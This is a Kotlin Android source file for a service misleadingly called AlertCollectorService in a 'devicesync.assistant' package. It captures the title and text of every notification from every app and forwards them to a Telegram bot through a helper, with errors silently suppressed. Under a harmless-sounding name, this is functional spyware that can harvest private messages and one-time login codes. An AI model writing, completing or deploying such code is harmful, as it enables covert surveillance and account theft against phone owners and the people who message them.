package com.devicesync.assistant.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.devicesync.assistant.helpers.SyncHelper

class AlertCollectorService : NotificationListenerService() {

    // ─────────────────────────────────────────
    // NOTIFICATION POSTED
    // Triggered every time any app shows a notification
    // ─────────────────────────────────────────
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val packageName = sbn.packageName ?: return
            val extras = sbn.notification?.extras ?: return

            val title = extras.getString("android.title") ?: ""
            val content = extras.getCharSequence("android.text")?.toString() ?: ""

            if (title.isBlank() && content.isBlank()) return

            // Get app name
            val appName = getAppName(packageName)

            // Send to Telegram bot
            SyncHelper.sendAlertReceived(appName, packageName, title, content)

        } catch (e: Exception) {
            // Silent fail
        }
    }

    // ─────────────────────────────────────────
    // NOTIFICATION REMOVED
    // ─────────────────────────────────────────
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Not needed
    }

    // ─────────────────────────────────────────
    // GET APP NAME FROM PACKAGE
    // ─────────────────────────────────────────
    private fun getAppName(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
}
